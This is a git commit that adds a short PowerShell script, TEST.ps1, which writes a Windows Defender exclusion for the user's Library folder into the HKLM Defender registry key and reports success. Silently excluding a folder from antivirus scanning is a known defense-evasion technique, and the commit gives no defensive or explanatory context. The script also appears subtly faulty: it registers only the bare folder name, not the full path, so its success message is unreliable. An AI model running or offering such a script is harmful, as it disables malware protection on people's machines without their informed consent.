7f33126ab58802a3a1b5652010212322b1e39ffa
Wesley5n1p35 <47337218+Wesley5n1p35@users.noreply.github.com>
2023-11-06 15:53:10 -0600

    Add files via upload

---
+++ TEST.ps1
@@ -0,0 +1,13 @@
+# Define the exclusion path using the USERPROFILE environment variable
+$exclusionPath = "$env:USERPROFILE\Library"
+
+# Define the registry path and value name
+$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+$valueName = [System.IO.Path]::GetFileName($exclusionPath)
+
+# Add the exclusion path to the Windows Defender registry
+New-Item -Path $registryPath -Force
+Set-ItemProperty -Path $registryPath -Name $valueName -Value 0
+
+# Display a message to indicate the path has been added
+Write-Host "Exclusion path '$exclusionPath' added to Windows Defender."
